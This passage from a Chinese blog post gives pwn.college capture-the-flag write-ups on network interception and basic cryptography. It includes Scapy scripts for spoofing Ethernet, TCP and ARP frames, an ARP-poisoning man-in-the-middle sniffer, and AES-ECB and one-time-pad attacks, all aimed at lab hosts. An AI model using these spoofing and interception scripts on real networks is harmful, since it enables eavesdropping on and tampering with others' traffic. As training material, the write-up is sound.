class="keyword">elif</span> <span class="string">'length 0'</span> <span class="keyword">in</span> line:</span><br><span class="line">            recording = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> recording:</span><br><span class="line">            buffer.append(line)</span><br><span class="line">            <span class="comment"># 记录的行数达到 4 行时</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(buffer) == <span class="number">4</span>:</span><br><span class="line">                <span class="comment"># 输出最后一行的最后一个字符</span></span><br><span class="line">                last_line = buffer[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> last_line:</span><br><span class="line">                    last_char = last_line[-<span class="number">1</span>]</span><br><span class="line">                    flag+=last_char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Last character extracted: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">                <span class="comment"># 重置记录状态</span></span><br><span class="line">                recording = <span class="literal">False</span></span><br><span class="line">                buffer = []</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
<p>然后将tcpdump回显传给该脚本，得到flag（可能要多运行几次才能得到完整正确的flag）</p>
<p><code>tcpdump -A -i eth0 src host 10.0.0.3 and dst host 10.0.0.2 | python getflag.py</code></p>
<p>pwn.college{cTd7x9tiz-q-32migfK6GPucpAX.dRjNzMDLycDMyUzW}</p></li>
<li><p>level7：通过配置网络接口拦截远程主机的流量</p>
<p>wp：这题一开始没什么思路，
然后突然想到ARP协议，准备使用ARP欺骗，但是相关工具用不了，于是先使用<code>tcpdump -i eth0</code>查看本机的流量情况：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:50:00.376706 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:50:01.377721 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:50:02.379126 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br></pre></td></tr></tbody></table></figure>
<p>发现本机一直能够接收到10.0.0.4发送的ARP信息，然后就需要把我们的主机伪装成10.0.0.2，但是我不会怎么操作<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，参考<a target="_blank" rel="noopener" href="https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting-Communication.html">大佬的wp</a>，得知<code>ip</code>命令（用于配置和查看Linux网络设备和接口的工具），通过<code>ip addr add 10.0.0.2/24 dev eth0</code>为网络接口添加IP地址，然后监测流量：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-3:~# tcpdump -i eth0</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:53:25.649323 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:53:25.649344 ARP, Reply 10.0.0.2 is-at fe:b4:c0:4c:6b:f3 (oui Unknown), length 28</span><br><span class="line">08:53:25.649377 IP 10.0.0.4.40878 &gt; 10.0.0.2.31337: Flags [S], seq 2328130165, win 64240, options [mss 1460,sackOK,TS val 4097716417 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></tbody></table></figure>
<p>发现成功挟持流量，然后使用<code>nc -l 31337</code>查看flag</p></li>
<li><p>level8：手动发送以太帧</p>
<blockquote>
<p>Scapy是一个强大的Python库，用于网络数据包的生成、操作、嗅探和伪造。它支持大量的网络协议，包括以太网、IP、TCP、UDP等，使用户可以轻松地构建、发送和接收数据包</p>
<p>示例：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, sendp</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"01:02:03:04:05:06"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<p>wp：首先通过<code>ip addr show</code>查看本机MAC地址，然后通过上面的Python库编写脚本发送数据包（广播）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"de:33:4e:45:7f:2e"</span>, <span class="built_in">type</span>=<span class="number">0xFFFF</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：手动发送IP分组，下面是scapy库使用示例</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, send</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建一个IP数据包</span></span><br><span class="line">packet = IP(</span><br><span class="line">    dst=<span class="string">"8.8.8.8"</span>,           <span class="comment"># 目标IP地址</span></span><br><span class="line">    src=<span class="string">"10.0.0.1"</span>,          <span class="comment"># 源IP地址</span></span><br><span class="line">    ttl=<span class="number">128</span>,                 <span class="comment"># TTL值</span></span><br><span class="line">    <span class="built_in">id</span>=<span class="number">12345</span>,                <span class="comment"># 数据包标识符</span></span><br><span class="line">    flags=<span class="string">"DF"</span>,              <span class="comment"># Don't Fragment标志</span></span><br><span class="line">    tos=<span class="number">0x10</span>,                <span class="comment"># 服务类型</span></span><br><span class="line">    proto=<span class="number">1</span>                  <span class="comment"># ICMP协议</span></span><br><span class="line">) / <span class="string">"Hello, World!"</span>          <span class="comment"># 数据负载</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包</span></span><br><span class="line">send(packet)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>wp：直接根据上述代码构造IP分组，未知的参数就省略，但是运行结果报错<code>WARNING: No route found (no default route?)</code>，找不到有效路由，还是得通过数据链路层发送</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, sendp</span><br><span class="line"><span class="comment"># 数据包的构造： Ether / IP / data</span></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"be:08:7d:7b:c4:96"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0xFF</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：手动发送TCP报文段</p>
<p>wp：思路同上</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"4a:b6:df:8e:bd:97"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, ack=<span class="number">31337</span>, flags=<span class="string">"APRSF"</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level11：手动模拟TCP三次握手</p>
<p>wp：这里用到 tmux
分屏查看流量细节。左右分屏后在左边终端运行<code>tcpdump -i eth0</code>监测流量，然后在右边终端中运行下面的脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet1 = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:21:1d:a7:07:e7"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, flags=<span class="string">"S"</span>)</span><br><span class="line">sendp(packet1, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>此时左边终端出现TCP流量：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes             14:13:39.439207 IP 10.0.0.2.31337 &gt; 10.0.0.3.31337: Flags [S], seq 31337, win 8192, length 0                                                                             14:13:39.478926 IP 10.0.0.3.31337 &gt; 10.0.0.2.31337: Flags [S.], seq 558135948, ack 31338, win 8192, length 0 </span><br></pre></td></tr></tbody></table></figure>
<p>得到第三次TCP握手需要发送的<code>ack</code>的值<code>558135948+1</code>，然后运行下一个脚本，得到flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet2 = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:21:1d:a7:07:e7"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31338</span>, ack=<span class="number">558135949</span>, flags=<span class="string">"A"</span>)</span><br><span class="line">sendp(packet2, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level12：手动发送ARP数据包</p>
<p>wp：思路同上</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp_packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:4a:21:ea:20:33"</span>) / ARP(</span><br><span class="line">    pdst=<span class="string">"10.0.0.3"</span>,</span><br><span class="line">    hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,  <span class="comment"># 广播或目标主机的 MAC 地址</span></span><br><span class="line">    psrc=<span class="string">"10.0.0.2"</span>,</span><br><span class="line">    hwsrc=<span class="string">"9e:4a:21:ea:20:33"</span>,</span><br><span class="line">    op=<span class="string">"is-at"</span></span><br><span class="line">)</span><br><span class="line">sendp(arp_packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level13：使用ARP挟持远程主机的流量</p>
<p>wp：利用scapy库实现</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp_spoof = ARP(</span><br><span class="line">    pdst=<span class="string">"10.0.0.4"</span>,       <span class="comment"># 目标主机的 IP 地址</span></span><br><span class="line">    hwdst=<span class="string">"1A:25:92:8C:AD:4C"</span>,  <span class="comment"># 广播或目标主机的 MAC 地址</span></span><br><span class="line">    psrc=<span class="string">"10.0.0.2"</span>,        <span class="comment"># 欺骗的 IP 地址（假装这是你的 IP）</span></span><br><span class="line">    hwsrc=<span class="string">"aa:12:c3:a5:1b:9c"</span>,  <span class="comment"># 欺骗的 MAC 地址（用你的 MAC 地址）</span></span><br><span class="line">    op=<span class="string">"is-at"</span>                    <span class="comment"># 操作码 2 表示 ARP 回复</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 ARP 欺骗包</span></span><br><span class="line">send(arp_spoof)</span><br></pre></td></tr></tbody></table></figure>
<p>注意源IP地址是你需要利用的地址而不是你自己的IP地址，然后查看流量获取flag</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -A -i eth0</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level14：中间人攻击</p>
<p>wp：这里需要编写脚本进行ARP欺骗，让10.0.0.4主机认为我是10.0.0.3，让10.0.0.3认为我是10.0.0.4，从而实现拦截流量的目的。下面这段代码可以实现对应功能（用chatGPT生成的）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.http <span class="keyword">import</span> HTTPRequest, HTTPResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要攻击的 IP 地址</span></span><br><span class="line">target_ip1 = <span class="string">"10.0.0.4"</span></span><br><span class="line">target_ip2 = <span class="string">"10.0.0.2"</span></span><br><span class="line">iface = <span class="string">"eth0"</span>  <span class="comment"># 网络接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于 ARP 欺骗的目标 MAC 地址</span></span><br><span class="line">target_mac1 = <span class="string">"xx:xx:xx:xx:xx:xx"</span></span><br><span class="line">target_mac2 = <span class="string">"yy:yy:yy:yy:yy:yy"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send(ARP(op=<span class="number">2</span>, pdst=target_ip1, hwdst=target_mac1, psrc=target_ip2), iface=iface)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>, pdst=target_ip2, hwdst=target_mac2, psrc=target_ip1), iface=iface)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(HTTPRequest):</span><br><span class="line">        <span class="keyword">if</span> packet[HTTPRequest].Method == <span class="string">b"GET"</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Intercepted GET request to <span class="subst">{packet[HTTPRequest].Host}</span><span class="subst">{packet[HTTPRequest].Path}</span>"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 这里可以添加额外的流量或修改数据包</span></span><br><span class="line">            packet[IP].src = target_ip2</span><br><span class="line">            send(packet, iface=iface)</span><br><span class="line">    <span class="keyword">elif</span> packet.haslayer(HTTPResponse):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Intercepted HTTP response from <span class="subst">{packet[IP].src}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 可以在这里修改响应内容</span></span><br><span class="line">        packet[IP].dst = target_ip1</span><br><span class="line">        send(packet, iface=iface)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 启动 ARP 欺骗线程</span></span><br><span class="line">    <span class="keyword">import</span> threading</span><br><span class="line">    arp_thread = threading.Thread(target=arp_spoof)</span><br><span class="line">    arp_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始嗅探和修改流量</span></span><br><span class="line">    sniff(iface=iface, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>运行完该脚本后，通过<code>tcpdump -A -i eth0</code>监听流量，发现：10.0.0.3首先发送<em>SECRET</em>，然后10.0.0.4回复一串ASCii码，接着10.0.0.3发送<em>COMMANDS::，接着10.0.0.4回复</em>ECHO<em>，然后10.0.0.3发送</em>Hello
world！<em>。由此得出，若10.0.0.4发送包含</em>FLAG*的数据包，则会返回flag。但是脚本不会写，参考<a target="_blank" rel="noopener" href="https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting-Communication.html">大佬的wp</a>。</p></li>
</ul>
<h2 id="cryptography">Cryptography</h2>
<h3 id="知识点-5">知识点</h3>
<h4 id="symmetric-encryption对称加密">Symmetric
Encryption（对称加密）</h4>
<ul>
<li><p>One-Time
Pad：https://zh.wikipedia.org/wiki/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC</p></li>
<li><p>AES：详见 https://ctf-wiki.org/crypto/blockcipher/aes/</p>
<p>Key Size：128/192/256 bits</p>
<p>Block Size：128 bits（不够则需要补位，pck7标准）</p></li>
<li><p>ECB模式：分块</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105701266.png" alt="image-20240802105701266">
<figcaption aria-hidden="true">image-20240802105701266</figcaption>
</figure></li>
<li><p>CBC：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105617577.png" alt="image-20240802105617577">
<figcaption aria-hidden="true">image-20240802105617577</figcaption>
</figure></li>
<li><p>CTR：计数每次加1</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802111654091.png" alt="image-20240802111654091">
<figcaption aria-hidden="true">image-20240802111654091</figcaption>
</figure></li>
<li><p>Key Exchange：交换密钥</p>
<p>满足交换律的运算：加法，乘法，Paint Mixing</p>
<p>原根（Primitive
root）：https://zh.wikipedia.org/wiki/%E5%8E%9F%E6%A0%B9</p>
<p>Diffie–Hellman key exchange</p></li>
</ul>
<h4 id="key-exchange交换密钥">Key Exchange：交换密钥</h4>
<ul>
<li><p>满足交换律的运算：加法，乘法，Paint Mixing</p></li>
<li><p>原根（Primitive
root）：https://zh.wikipedia.org/wiki/%E5%8E%9F%E6%A0%B9</p></li>
<li><p><a target="_blank" rel="noopener" href="https://thiscute.world/posts/practical-cryptography-basics-5-key-exchange/">Diffie–Hellman
key exchange</a>（D-H）：密钥交换</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803104543316.png" alt="image-20240803104543316">
<figcaption aria-hidden="true">image-20240803104543316</figcaption>
</figure></li>
</ul>
<h4 id="asymmetric-encryption非对称加密">Asymmetric
Encryption（非对称加密）</h4>
<ul>
<li><p>公钥和私钥：公钥用于加密，私钥用于解密</p></li>
<li><p>Fermat's little
theorem（费马小定理）：https://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86</p></li>
<li><p>Euler's
Theorem（欧拉定理）：https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA)</p></li>
<li><p>RSA：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803153341591.png" alt="image-20240803153341591">
<figcaption aria-hidden="true">image-20240803153341591</figcaption>
</figure></li>
</ul>
<h4 id="hashing">Hashing</h4>
<ul>
<li>散列函数（哈希函数）：结果一般为固定长度字符串</li>
<li>hash with
salt：https://zh.wikipedia.org/wiki/%E7%9B%90_(%E5%AF%86%E7%A0%81%E5%AD%A6)</li>
</ul>
<h3 id="练习-5">练习</h3>
<ul>
<li><p>level1：base64解码</p>
<p>wp：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">""</span>))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：一次性密码本</p>
<p>wp：题目给出base64编码状态下的密钥和密文，我一开始直接将两个base64字符串进行异或发现行不通，于是尝试先解码再异或，得到flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"lzygDwIWT8kdWoKrgRvtrAbQ7cBuDUDDNSvX0Gu0GnacUUJ3H1Hd90MqbU8pT680nI/TcdT6vzctZw=="</span></span><br><span class="line">b = <span class="string">"50vOIWF5I6V4PefQyHeV3V+63rU0ZhOgUESZ6Tr4byHkF28DdQSa2Sd4FwFTAut45eyXPK2vxWBQbQ=="</span></span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">b = base64.b64decode(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c += <span class="built_in">chr</span>(b[i]^key[i])</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：一次性密码本，密钥可重复使用</p>
<p>wp：密文（secret
ciphertext）已给出，根据题目给出的提示，要求输入明文，然后输出密文。于是我尝试将给定的密文当作明文输入然后得到新的密文，如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secret ciphertext (b64): y1GAvqAJ5TANUn2ZarGZGXRD3I26DTAfcDtoAV1QKHBXV8jC3FJyeoj96p09m94T7LCkIPGw78X4JQ==</span><br><span class="line">plaintext (b64): y1GAvqAJ5TANUn2ZarGZGXRD3I26DTAfcDtoAV1QKHBXV8jC3FJyeoj96p09m94T7LCkIPGw78X4JQ==</span><br><span class="line">ciphertext (b64): cHduLmNvbGxlZ2V7MHJrRHliUFJSOTRBNC1Pc3NRM1JMLWc5Z2JmLmRWek56TURMeWNETXlVeld9Cg==</span><br></pre></td></tr></tbody></table></figure>
<p>这里的逻辑应该是：</p>
<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> flag ^ key = secret ciphertext </span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> secret ciphertext  ^ key = ciphertext</span><br><span class="line"></span><br><span class="line">由上述两个式子得到：</span><br><span class="line">flag ^ key ^ key = ciphertext   --&gt;   flag = ciphertext</span><br></pre></td></tr></tbody></table></figure>
<p>因此只需要解码<code>cHduLmNvbGxlZ2V7MHJrRHliUFJSOTRBNC1Pc3NRM1JMLWc5Z2JmLmRWek56TURMeWNETXlVeld9Cg==</code>即可得到flag。</p></li>
<li><p>level4：用ECB模式解码AES密文</p>
<p>wp：这里使用到了新的第三方库<code>pycryptodome</code>，可以直接调用相关函数进行解码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = base64.b64decode(<span class="string">"vOQZoG8aprySJx290+gqTQ=="</span>)</span><br><span class="line">b = base64.b64decode(<span class="string">"SFD4LBev3isNX+sOSP16YkvC4j/tESguw9+M+ZIoovxMNjxZCaPzy51L1Speg0YJyM56R5/BUUHe/x+mKWJZtg=="</span>)</span><br><span class="line"></span><br><span class="line">key = a</span><br><span class="line">text = b</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line"><span class="comment"># AES.MODE_ECB 表示模式是ECB模式</span></span><br><span class="line">den_text = aes.decrypt(text) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(den_text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：ECB已知密文攻击-https://zachgrace.com/posts/attacking-ecb/</p>
<p>wp：运行<code>/challenge/run</code>，根据<a target="_blank" rel="noopener" href="https://discord.com/channels/750635557666816031/1193137618049831063/threads/1243932046611710034">Discord</a>提示得知这题是关于ECB攻击的题目，因此尝试输入<code>base64.b64encode(b'A'*15)</code>的base64编码，然后再尝试输入<code>base64.b64encode(b'A'*15+b'p')</code>的base64编码（因为flag开头字母是<code>p</code>），得到：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secret ciphertext (b64): 4SXc1LwERwQOBKZt4rCInS5O3Yevihuy2bnTOPn3DxWZOUY1LZ6B9pHGPJeIsR4gAjWf06jm/2HrwLV2c3Bv+g==</span><br><span class="line">secret ciphertext (hex): e125dcd4bc0447040e04a66de2b0889d 2e4edd87af8a1bb2d9b9d338f9f70f15 993946352d9e81f691c63c9788b11e20 02359fd3a8e6ff61ebc0b57673706ffa</span><br><span class="line">plaintext prefix (b64): QUFBQUFBQUFBQUFBQUFB</span><br><span class="line">ciphertext (b64): ta3Mmvi7a/uvAgdN2uAl0fdN9imt+R0sJxGye4JemYbGOzhwqRHPYZy4RTjv/dn25I3mK8XeotVgMVlyCuPW1nFFsxqEyM8mmpjyEvfsDbQ=</span><br><span class="line">ciphertext (hex): b5adcc9af8bb6bfbaf02074ddae025d1 f74df629adf91d2c2711b27b825e9986 c63b3870a911cf619cb84538effdd9f6 e48de62bc5dea2d5603159720ae3d6d6 7145b31a84c8cf269a98f212f7ec0db4</span><br><span class="line">plaintext prefix (b64): QUFBQUFBQUFBQUFBQUFBcA==</span><br><span class="line">ciphertext (b64): ta3Mmvi7a/uvAgdN2uAl0eEl3NS8BEcEDgSmbeKwiJ0uTt2Hr4obstm50zj59w8VmTlGNS2egfaRxjyXiLEeIAI1n9Oo5v9h68C1dnNwb/o=</span><br><span class="line">ciphertext (hex): b5adcc9af8bb6bfbaf02074ddae025d1 e125dcd4bc0447040e04a66de2b0889d 